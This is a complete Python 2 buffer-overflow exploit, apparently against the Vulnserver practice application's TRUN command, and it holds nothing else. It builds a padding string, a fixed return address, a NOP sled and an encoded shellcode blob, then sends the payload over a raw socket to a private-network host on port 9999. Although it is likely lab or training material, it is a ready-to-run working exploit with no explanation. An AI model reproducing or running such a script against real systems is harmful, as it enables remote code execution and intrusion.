#!/usr/bin/python
import sys, socket

overflow = (
"\xba\x8e\x15\x85\x35\xdd\xc1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\xd8\x1b\x67\xc0\x18\xcb\xe5"
"\x2b\xe0\x0c\x8a\xa2\x05\x3d\x8a\xd1\x4e\x6e\x3a\x91\x02\x83"
"\xb1\xf7\xb6\x10\xb7\xdf\xb9\x91\x72\x06\xf4\x22\x2e\x7a\x97"
"\xa0\x2d\xaf\x77\x98\xfd\xa2\x76\xdd\xe0\x4f\x2a\xb6\x6f\xfd"
"\xda\xb3\x3a\x3e\x51\x8f\xab\x46\x86\x58\xcd\x67\x19\xd2\x94"
"\xa7\x98\x37\xad\xe1\x82\x54\x88\xb8\x39\xae\x66\x3b\xeb\xfe"
"\x87\x90\xd2\xce\x75\xe8\x13\xe8\x65\x9f\x6d\x0a\x1b\x98\xaa"
"\x70\xc7\x2d\x28\xd2\x8c\x96\x94\xe2\x41\x40\x5f\xe8\x2e\x06"
"\x07\xed\xb1\xcb\x3c\x09\x39\xea\x92\x9b\x79\xc9\x36\xc7\xda"
"\x70\x6f\xad\x8d\x8d\x6f\x0e\x71\x28\xe4\xa3\x66\x41\xa7\xab"
"\x4b\x68\x57\x2c\xc4\xfb\x24\x1e\x4b\x50\xa2\x12\x04\x7e\x35"
"\x54\x3f\xc6\xa9\xab\xc0\x37\xe0\x6f\x94\x67\x9a\x46\x95\xe3"
"\x5a\x66\x40\xa3\x0a\xc8\x3b\x04\xfa\xa8\xeb\xec\x10\x27\xd3"
"\x0d\x1b\xed\x7c\xa7\xe6\x66\x43\x90\x53\xf7\x2b\xe3\xa3\xe9"
"\xf7\x6a\x45\x63\x18\x3b\xde\x1c\x81\x66\x94\xbd\x4e\xbd\xd1"
"\xfe\xc5\x32\x26\xb0\x2d\x3e\x34\x25\xde\x75\x66\xe0\xe1\xa3"
"\x0e\x6e\x73\x28\xce\xf9\x68\xe7\x99\xae\x5f\xfe\x4f\x43\xf9"
"\xa8\x6d\x9e\x9f\x93\x35\x45\x5c\x1d\xb4\x08\xd8\x39\xa6\xd4"
"\xe1\x05\x92\x88\xb7\xd3\x4c\x6f\x6e\x92\x26\x39\xdd\x7c\xae"
"\xbc\x2d\xbf\xa8\xc0\x7b\x49\x54\x70\xd2\x0c\x6b\xbd\xb2\x98"
"\x14\xa3\x22\x66\xcf\x67\x42\x85\xc5\x9d\xeb\x10\x8c\x1f\x76"
"\xa3\x7b\x63\x8f\x20\x89\x1c\x74\x38\xf8\x19\x30\xfe\x11\x50"
"\x29\x6b\x15\xc7\x4a\xbe")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.187.128',9999))                          
        s.send(("TRUN /.:/" + shellcode))
        s.close()
	
except: 
        print "Error connecting to server"
        sys.exit()
